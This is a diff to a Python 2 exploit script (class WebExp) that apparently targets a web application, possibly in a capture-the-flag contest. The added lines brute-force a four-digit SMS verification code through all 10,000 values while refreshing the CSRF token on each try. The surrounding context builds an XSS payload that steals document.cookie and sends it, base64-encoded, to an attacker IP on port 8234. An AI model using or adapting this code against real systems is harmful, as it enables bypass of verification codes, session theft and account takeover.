@@ -126,6 +126,17 @@ class WebExp:
         else:
             print 'exp2 fixed'
 
+        # crack sms code
+        print 'cracking sms code'
+        for i in range(0,10000):
+            rs = self.session.get(self.url + 'user/check')
+            token = self._get_token(rs.text)
+            # print token
+            rs = self.session.post(url=self.url + 'user/check', data={
+                self.csrfname: token,
+                "code":"%04d"%i
+            })
+
         rs = self.session.get(self.url + 'tickets')
         payload='b=document.cookie;a="<img src=http://{}:8234/"+btoa(b)+">";document.write(a);'.format(ip)
         payload=base64.b64encode(payload)
